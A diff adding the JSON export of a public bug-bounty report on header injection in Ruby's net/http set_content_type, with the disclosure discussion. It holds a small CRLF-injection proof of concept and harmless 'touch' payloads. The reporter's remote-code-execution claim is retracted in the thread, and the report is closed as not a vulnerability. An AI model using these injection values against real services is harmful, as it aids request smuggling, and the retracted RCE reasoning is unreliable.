@@ -1,0 +1,666 @@
+{
+    "id": 1168205,
+    "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMTY4MjA1",
+    "url": "https://hackerone.com/reports/1168205",
+    "title": "'net/http': HTTP Header Injection in the set_content_type method",
+    "state": "Closed",
+    "substate": "informative",
+    "severity_rating": "high",
+    "readable_substate": "Informative",
+    "created_at": "2021-04-19T09:25:39.912Z",
+    "submitted_at": "2021-04-19T09:25:40.010Z",
+    "is_member_of_team?": false,
+    "is_organization_group_member?": false,
+    "reporter": {
+        "disabled": false,
+        "username": "sighook",
+        "url": "/sighook",
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/variants/8bTs1ocGqLJRNZAWnFyrSfqK/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
+        },
+        "is_me?": false,
+        "cleared": false,
+        "verified": false,
+        "hackerone_triager": false,
+        "hacker_mediation": false
+    },
+    "team": {
+        "id": 7724,
+        "url": "https://hackerone.com/ruby",
+        "handle": "ruby",
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/variants/000/007/724/bb067434deef370d6a0b16c2cbbc030b57c75e92_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+            "medium": "https://profile-photos.hackerone-user-content.com/variants/000/007/724/bb067434deef370d6a0b16c2cbbc030b57c75e92_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "permissions": [],
+        "submission_state": "open",
+        "default_currency": "usd",
+        "awards_miles": false,
+        "offers_bounties": true,
+        "state": "public_mode",
+        "only_cleared_hackers": false,
+        "pentest_feature_enabled?": false,
+        "profile": {
+            "name": "Ruby",
+            "twitter_handle": "",
+            "website": "https://www.ruby-lang.org",
+            "about": "A Programmer's Best Friend"
+        }
+    },
+    "has_bounty?": false,
+    "in_validation?": false,
+    "can_view_team": true,
+    "can_view_report": true,
+    "is_external_bug": false,
+    "is_published": false,
+    "is_participant": false,
+    "has_collaborators": false,
+    "submitted_by_team_member": false,
+    "stage": 4,
+    "public": true,
+    "visibility": "full",
+    "cve_ids": [],
+    "singular_disclosure_disabled": true,
+    "disclosed_at": "2022-02-04T06:31:47.596Z",
+    "bug_reporter_agreed_on_going_public_at": "2021-10-22T16:33:14.652Z",
+    "team_member_agreed_on_going_public_at": "2022-02-04T06:31:47.497Z",
+    "comments_closed?": false,
+    "facebook_team?": false,
+    "team_private?": false,
+    "vulnerability_information": "The set\\_content\\_type's parameter is not filtered to prevent the injection from altering the entire request.\n\nThe vulnerable code:\n```ruby\n  def set_content_type(type, params = {})\n    @header['content-type'] = [type + params.map{|k,v|\"; #{k}=#{v}\"}.join('')]\n  end\n```\n\n# PoC\n\n1.\n```ruby\nrequire 'net/http'\n\nuri = URI('http://127.0.0.1:8080')\nreq = Net::HTTP::Post.new(uri)\nreq.set_content_type('text/html', \"charset\" => \"iso-8859-1\\nHeader:Inject\")\n\nresp = Net::HTTP.start(uri.hostname, uri.port) do |http|\n  http.request(req)\nend\n```\n\n2.\n```\n$ nc -lvp 8080\nListening on 0.0.0.0 8080\nConnection received on localhost 57620\nPOST / HTTP/1.1\nAccept-Encoding: gzip;q=1.0,deflate;q=0.6,identity;q=0.3\nAccept: */*\nUser-Agent: Ruby\nHost: 127.0.0.1:8080\nContent-Type: text/html; charset=iso-8859-1\nHeader:Inject # <<<<<<<<\nContent-Length: 0\n```\n\nI set the same severity as [CVE-2020-26116](https://nvd.nist.gov/vuln/detail/CVE-2020-26116) has.\n\n## Impact\n\nIn web applications a CRLF injection can have severe impacts, depending on what the application does with single items. Impacts can range from information disclosure to code execution, a direct impact web application security vulnerability.",
+    "weakness": {
+        "id": 69,
+        "name": "CRLF Injection"
+    },
+    "original_report_id": null,
+    "original_report_url": null,
+    "attachments": [],
+    "allow_singular_disclosure_at": null,
+    "vote_count": 8,
+    "voters": [
+        "zzero",
+        "foobar7",
+        "kaulse",
+        "sign3tsh3l1",
+        "ab2pentest",
+        "meispi",
+        "anton_ivanov",
+        "audifinds"
+    ],
+    "severity": {
+        "rating": "high",
+        "score": 7.2,
+        "author_type": "User",
+        "metrics": {
+            "attack_vector": "network",
+            "attack_complexity": "low",
+            "privileges_required": "none",
+            "user_interaction": "none",
+            "scope": "changed",
+            "confidentiality": "low",
+            "integrity": "low",
+            "availability": "none"
+        }
+    },
+    "structured_scope": {
+        "databaseId": 28212,
+        "asset_type": "SOURCE_CODE",
+        "asset_identifier": "https://github.com/ruby/ruby",
+        "max_severity": "critical"
+    },
+    "abilities": {
+        "assignable_team_members": [],
+        "assignable_team_member_groups": []
+    },
+    "activities": [
+        {
+            "id": 11434957,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Thank you. @naruse , what do you think?",
+            "automated_response": false,
+            "created_at": "2021-04-19T09:40:12.987Z",
+            "updated_at": "2021-04-19T09:40:12.987Z",
+            "actor": {
+                "username": "mame",
+                "cleared": false,
+                "verified": false,
+                "url": "/mame",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/8vhoh1hyan61xovrmfhy7kmi4gib/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "ruby"
+        },
+        {
+            "id": 11434972,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::BugTriaged",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2021-04-19T09:41:55.884Z",
+            "updated_at": "2021-04-19T09:41:55.884Z",
+            "actor": {
+                "username": "hsbt",
+                "cleared": false,
+                "verified": false,
+                "url": "/hsbt",
+                "profile_picture_urls": {
+                    "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/dx6z1zqthgan1c4rv9ppn4jx3832/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937?response-content-disposition=inline%3B%20filename%3D%222eUvHh_4_400x400.png%22%3B%20filename%2A%3DUTF-8%27%272eUvHh_4_400x400.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYY3KUHY6%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T070442Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDbZ%2FrzMJPkXzqJKGhUDJxaKvRKOwgW3L9NoGgTQYNluwIgP%2FQUNBim5xYJkBE4bibyDr4jMY%2FqMgU8yTBdR9QfoSQquwUIoP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDDEZLUDtzsol34pf1yqPBZq6rwka9dcUmP1Z24HNrPUaSjikKtPCd8tWm8aqp4p6845zp81qitLzXk9PwD9slj3c%2BSQSWjztZWIJEXZWIIlCQ8zW3V0YeF%2BPbkNoqrw1iHYiPAXC3t9y2cnp7uesZte%2B5t1Hb%2BbmTSUMQfTPsazLeu4nH%2F9MWkcvLY34rjH54kSRBSKoSpNPgPj2kSMe0Agn9jQ102utMKoMlhVvvqtnQmOO3yY83c9MPBbCmAsuXLoVvwRyAURznumXGaAY8T%2B16canJngAP7ML%2BGxqR9a4ioL%2FIEyZSARvH%2BOf1TL1KtnyqLRmKVMht7VNGhWu30mxL%2BAZvsBaOHSbngtEExTFVCGCjgA2bXH0nM7V4nVzgSBjnCm4xHKwlKw2UGiCKE1jyfYLNBgBnjuBeFtvw%2FIXEVAwP1X%2BGxr%2BBJEndKkov5kap4UxeFIHzwNu%2BuncV7Htjx%2B5Ceg3lS1dVXtigyLqfWS9ZDcUOzUU8a%2Bc2xMZW9%2FDGUXGEivZ6wchu7US3C7TYxKEqYefV4bC7u%2BQO8geofYjAWDWujYfUQPfe2CWBUQKd0IbyyY8dVsRqXxXquWP2PWT6zzBxgu8QOuklVxDBrNLKbnQ5Xm9tuf3xELeqIHfe%2BGfDIpigjAR4iago3Vsz8V7gdnhQUBe4ae8zi26qOx8xVbJBK3TtN9dyjtmyAO%2BWWqtf2WMN8S7GtgDCOEzmPtLc6hxX9Olifu0uGtBRSb0zE0EOX16pUQ7%2FFcPTQsSLqJC4c33cv%2BYTmjfyDDgUNUS4WbOmU0UwWv4bnaXCRIk8v9ZvvpaPfvZC1lx6k6alXR4GMigA2XBEFD852wBKdWpfiKe%2B4KEwnLNAeKE4xXaAmclAQBS8jFTLsYwsJ62pwY6sQHyCoWizkYjoXsyfeuh51YDF9e38C97iPYDjIXpJSSm1TTtLU%2FTGWnKeQisJw%2FcC8RKX7KKsFxYNATPCKUXKb05GVgEvZvvRtb71Ou3fUQO2phoABIv%2FguN%2BQLZIk23gYhvoCnzlJyh%2Bs4YT4Y9NBe%2BuO50gRcLkId0hIDo3s3rVFEHd3DeobVXe7TJmQ%2FoPHXywJmCBc5i%2FnGGtc8UW4nb1QByAu4MMgRtTUGscF6wF9Q%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=c95d422d3d54e3227f6d5610d39204e44f688219b2618cd76595da5a144e1467"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "ruby"
+        },
+        {
+            "id": 11561448,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "In applications involving `set_content_type`, it is possible to escalate the vulnerability to HTTP Request Smuggling / HTTP Desync attacks.",
+            "automated_response": false,
+            "created_at": "2021-04-29T06:43:54.544Z",
+            "updated_at": "2021-04-29T06:43:54.544Z",
+            "actor": {
+                "username": "sighook",
+                "cleared": false,
+                "verified": false,
+                "url": "/sighook",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/8bTs1ocGqLJRNZAWnFyrSfqK/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "ruby"
+        },
+        {
+            "id": 11561472,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Forget it, I didn't wake up) Sorry.",
+            "automated_response": false,
+            "created_at": "2021-04-29T06:46:34.867Z",
+            "updated_at": "2021-04-29T06:46:34.867Z",
+            "actor": {
+                "username": "sighook",
+                "cleared": false,
+                "verified": false,
+                "url": "/sighook",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/8bTs1ocGqLJRNZAWnFyrSfqK/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "ruby"
+        },
+        {
+            "id": 12530439,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "In addition to checking for `[\\r\\n]` it is necessary to sanitize `#{k}`/`#{v}` interpolation. Otherwise, it may lead to RCE:\n\na) OS Command injection\n```ruby\nreq.set_content_type('text/html',\n\"charset\" => \"iso-8859-1\\nHeader:Inject\\n#{`touch example.rb`}\")\n```\n\nb) Code injection\n```ruby\nreq.set_content_type('text/html',\n\"charset\" => \"iso-8859-1\\nHeader:Inject\\n#{require 'fileutils';FileUtils.touch 'example'}\")\n```\n",
+            "automated_response": false,
+            "created_at": "2021-07-16T12:30:42.163Z",
+            "updated_at": "2021-07-16T12:30:42.163Z",
+            "actor": {
+                "username": "sighook",
+                "cleared": false,
+                "verified": false,
+                "url": "/sighook",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/8bTs1ocGqLJRNZAWnFyrSfqK/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "ruby"
+        },
+        {
+            "id": 12533064,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "When/where do you think the generated header string will be `eval`ed as Ruby code?",
+            "automated_response": false,
+            "created_at": "2021-07-16T14:14:38.978Z",
+            "updated_at": "2021-07-16T14:14:38.978Z",
+            "actor": {
+                "username": "nobu",
+                "cleared": false,
+                "verified": false,
+                "url": "/nobu",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/083/585/0d7081d0d147b05e9630bb56974707efae6d6721_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "ruby"
+        },
+        {
+            "id": 12533324,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "hi @nobu,\n\n`net/http` is widely used in server-side software. For example, it is often used  for API / Callback Requests. An attacker could use this flaw to inject additional headers / command / code in a ruby application that allowed user provided header names or values.\n\nFor example, a less dangerous vulnerability in the Python project (only CRLF injection) has been assigned cve-2016-5699:\n\n- https://access.redhat.com/security/cve/cve-2016-5699\n- https://hackerone.com/reports/165102\n\nThe vulnerability essence is the same: one to one.\n\n",
+            "automated_response": false,
+            "created_at": "2021-07-16T14:29:58.616Z",
+            "updated_at": "2021-07-16T14:31:37.839Z",
+            "actor": {
+                "username": "sighook",
+                "cleared": false,
+                "verified": false,
+                "url": "/sighook",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/8bTs1ocGqLJRNZAWnFyrSfqK/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "ruby"
+        },
+        {
+            "id": 12550137,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "I mean that interpolated fragments are just strings and a part looks like a string interpolation is not a string interpolation.",
+            "automated_response": false,
+            "created_at": "2021-07-18T02:44:44.900Z",
+            "updated_at": "2021-07-18T02:44:44.900Z",
+            "actor": {
+                "username": "nobu",
+                "cleared": false,
+                "verified": false,
+                "url": "/nobu",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/083/585/0d7081d0d147b05e9630bb56974707efae6d6721_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "ruby"
+        },
+        {
+            "id": 12560534,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "OMG, I realized how badly I had messed up with 'interpolation issue'  O_O\n\"Shame, shame, I know your name...\". Excuse me, please.\n\n@nobu\nWell, only CVE-2016-5699-like \"Header Injection\" remains.",
+            "automated_response": false,
+            "created_at": "2021-07-19T08:08:24.612Z",
+            "updated_at": "2021-07-19T08:08:24.612Z",
+            "actor": {
+                "username": "sighook",
+                "cleared": false,
+                "verified": false,
+                "url": "/sighook",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/8bTs1ocGqLJRNZAWnFyrSfqK/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "ruby"
+        },
+        {
+            "id": 13102224,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "any updates?",
+            "automated_response": false,
+            "created_at": "2021-08-21T09:30:57.399Z",
+            "updated_at": "2021-08-21T09:30:57.399Z",
+            "actor": {
+                "username": "sighook",
+                "cleared": false,
+                "verified": false,
+                "url": "/sighook",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/8bTs1ocGqLJRNZAWnFyrSfqK/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "ruby"
+        },
+        {
+            "id": 13962277,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Forgive me for bothering you, just considering that the report is 6 months old and its status is \"triaged\", I remind you about it so that it does not get lost. ",
+            "automated_response": false,
+            "created_at": "2021-10-19T12:01:46.200Z",
+            "updated_at": "2021-10-19T12:01:46.200Z",
+            "actor": {
+                "username": "sighook",
+                "cleared": false,
+                "verified": false,
+                "url": "/sighook",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/8bTs1ocGqLJRNZAWnFyrSfqK/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "ruby"
+        },
+        {
+            "id": 13964170,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "**Who** inserts that string to **what** headers?\nDo you mean that an attacker can build malicious requests using net/http?",
+            "automated_response": false,
+            "created_at": "2021-10-19T14:47:48.940Z",
+            "updated_at": "2021-10-19T14:47:48.940Z",
+            "actor": {
+                "username": "nobu",
+                "cleared": false,
+                "verified": false,
+                "url": "/nobu",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/083/585/0d7081d0d147b05e9630bb56974707efae6d6721_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "ruby"
+        },
+        {
+            "id": 13964593,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "@nobu\n\nIf the server-side application relies on this flow to add the additional header to the request that it makes based on data provided/controlled by an attacker, that allows to attacker to inject additional headers/command/code into the request.\n\nFor example, we have an app which makes API-callback to the client.  It relies on the client's content-type request value, and add that value to the headers of the request which will be sent back to the client callback server. Since the application uses a vulnerable mechanism for this, an attacker can inject into the content-type value additional headers, make request smuggling, attack memcached/redis, and so on that follows from the header injection.",
+            "automated_response": false,
+            "created_at": "2021-10-19T15:29:32.486Z",
+            "updated_at": "2021-10-19T15:29:32.486Z",
+            "actor": {
+                "username": "sighook",
+                "cleared": false,
+                "verified": false,
+                "url": "/sighook",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/8bTs1ocGqLJRNZAWnFyrSfqK/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "ruby"
+        },
+        {
+            "id": 13987626,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ReportTitleUpdated",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2021-10-21T01:19:37.790Z",
+            "updated_at": "2021-10-21T01:19:37.790Z",
+            "additional_data": {
+                "old_title": "'net/http': HTTP Header Injection in the set\\_content\\_type method",
+                "new_title": "'net/http': HTTP Header Injection in the set_content_type method"
+            },
+            "actor": {
+                "username": "nobu",
+                "cleared": false,
+                "verified": false,
+                "url": "/nobu",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/083/585/0d7081d0d147b05e9630bb56974707efae6d6721_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "ruby"
+        },
+        {
+            "id": 13987665,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::CveIdAdded",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2021-10-21T01:29:23.573Z",
+            "updated_at": "2021-10-21T01:29:23.573Z",
+            "cve_ids": [],
+            "actor": {
+                "username": "hsbt",
+                "cleared": false,
+                "verified": false,
+                "url": "/hsbt",
+                "profile_picture_urls": {
+                    "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/dx6z1zqthgan1c4rv9ppn4jx3832/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937?response-content-disposition=inline%3B%20filename%3D%222eUvHh_4_400x400.png%22%3B%20filename%2A%3DUTF-8%27%272eUvHh_4_400x400.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYY3KUHY6%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T070442Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDbZ%2FrzMJPkXzqJKGhUDJxaKvRKOwgW3L9NoGgTQYNluwIgP%2FQUNBim5xYJkBE4bibyDr4jMY%2FqMgU8yTBdR9QfoSQquwUIoP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDDEZLUDtzsol34pf1yqPBZq6rwka9dcUmP1Z24HNrPUaSjikKtPCd8tWm8aqp4p6845zp81qitLzXk9PwD9slj3c%2BSQSWjztZWIJEXZWIIlCQ8zW3V0YeF%2BPbkNoqrw1iHYiPAXC3t9y2cnp7uesZte%2B5t1Hb%2BbmTSUMQfTPsazLeu4nH%2F9MWkcvLY34rjH54kSRBSKoSpNPgPj2kSMe0Agn9jQ102utMKoMlhVvvqtnQmOO3yY83c9MPBbCmAsuXLoVvwRyAURznumXGaAY8T%2B16canJngAP7ML%2BGxqR9a4ioL%2FIEyZSARvH%2BOf1TL1KtnyqLRmKVMht7VNGhWu30mxL%2BAZvsBaOHSbngtEExTFVCGCjgA2bXH0nM7V4nVzgSBjnCm4xHKwlKw2UGiCKE1jyfYLNBgBnjuBeFtvw%2FIXEVAwP1X%2BGxr%2BBJEndKkov5kap4UxeFIHzwNu%2BuncV7Htjx%2B5Ceg3lS1dVXtigyLqfWS9ZDcUOzUU8a%2Bc2xMZW9%2FDGUXGEivZ6wchu7US3C7TYxKEqYefV4bC7u%2BQO8geofYjAWDWujYfUQPfe2CWBUQKd0IbyyY8dVsRqXxXquWP2PWT6zzBxgu8QOuklVxDBrNLKbnQ5Xm9tuf3xELeqIHfe%2BGfDIpigjAR4iago3Vsz8V7gdnhQUBe4ae8zi26qOx8xVbJBK3TtN9dyjtmyAO%2BWWqtf2WMN8S7GtgDCOEzmPtLc6hxX9Olifu0uGtBRSb0zE0EOX16pUQ7%2FFcPTQsSLqJC4c33cv%2BYTmjfyDDgUNUS4WbOmU0UwWv4bnaXCRIk8v9ZvvpaPfvZC1lx6k6alXR4GMigA2XBEFD852wBKdWpfiKe%2B4KEwnLNAeKE4xXaAmclAQBS8jFTLsYwsJ62pwY6sQHyCoWizkYjoXsyfeuh51YDF9e38C97iPYDjIXpJSSm1TTtLU%2FTGWnKeQisJw%2FcC8RKX7KKsFxYNATPCKUXKb05GVgEvZvvRtb71Ou3fUQO2phoABIv%2FguN%2BQLZIk23gYhvoCnzlJyh%2Bs4YT4Y9NBe%2BuO50gRcLkId0hIDo3s3rVFEHd3DeobVXe7TJmQ%2FoPHXywJmCBc5i%2FnGGtc8UW4nb1QByAu4MMgRtTUGscF6wF9Q%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=c95d422d3d54e3227f6d5610d39204e44f688219b2618cd76595da5a144e1467"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "ruby"
+        },
+        {
+            "id": 13987722,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Leaving the server-side, I’m curious about the client-side.\nCVE-2016-5699 is \"via CRLF sequences in a URL\", is there any way to set the content type from a URL?",
+            "automated_response": false,
+            "created_at": "2021-10-21T01:48:03.760Z",
+            "updated_at": "2021-10-21T01:48:03.760Z",
+            "actor": {
+                "username": "nobu",
+                "cleared": false,
+                "verified": false,
+                "url": "/nobu",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/083/585/0d7081d0d147b05e9630bb56974707efae6d6721_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "ruby"
+        },
+        {
+            "id": 13989000,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::BugInformative",
+            "message": "net/http is a library. Its input generally needs to be a sanity value.\nI don't object the discussion whether it should have fail-safe or not, but I think this is not vulnerability.",
+            "automated_response": false,
+            "created_at": "2021-10-21T04:41:48.614Z",
+            "updated_at": "2021-10-21T04:41:48.614Z",
+            "actor": {
+                "username": "naruse",
+                "cleared": false,
+                "verified": false,
+                "url": "/naruse",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/084/606/edb9423e5c15557306e32721089996506ffbcf02_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "ruby"
+        },
+        {
+            "id": 14013438,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::AgreedOnGoingPublic",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2021-10-22T16:33:14.687Z",
+            "updated_at": "2021-10-22T16:33:14.687Z",
+            "first_to_agree": true,
+            "actor": {
+                "username": "sighook",
+                "cleared": false,
+                "verified": false,
+                "url": "/sighook",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/8bTs1ocGqLJRNZAWnFyrSfqK/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "ruby"
+        },
+        {
+            "id": 14754527,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Let's disclose it?",
+            "automated_response": false,
+            "created_at": "2021-12-21T01:44:08.104Z",
+            "updated_at": "2021-12-21T01:44:08.104Z",
+            "actor": {
+                "username": "sighook",
+                "cleared": false,
+                "verified": false,
+                "url": "/sighook",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/8bTs1ocGqLJRNZAWnFyrSfqK/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "ruby"
+        },
+        {
+            "id": 14816890,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "any updates?",
+            "automated_response": false,
+            "created_at": "2021-12-26T17:11:58.484Z",
+            "updated_at": "2021-12-26T17:11:58.484Z",
+            "actor": {
+                "username": "sighook",
+                "cleared": false,
+                "verified": false,
+                "url": "/sighook",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/8bTs1ocGqLJRNZAWnFyrSfqK/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "ruby"
+        },
+        {
+            "id": 15325201,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Let's disclose it?",
+            "automated_response": false,
+            "created_at": "2022-02-04T04:39:39.814Z",
+            "updated_at": "2022-02-04T04:39:39.814Z",
+            "actor": {
+                "username": "sighook",
+                "cleared": false,
+                "verified": false,
+                "url": "/sighook",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/8bTs1ocGqLJRNZAWnFyrSfqK/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "ruby"
+        },
+        {
+            "id": 15326581,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::AgreedOnGoingPublic",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2022-02-04T06:31:47.532Z",
+            "updated_at": "2022-02-04T06:31:47.532Z",
+            "actor": {
+                "username": "hsbt",
+                "cleared": false,
+                "verified": false,
+                "url": "/hsbt",
+                "profile_picture_urls": {
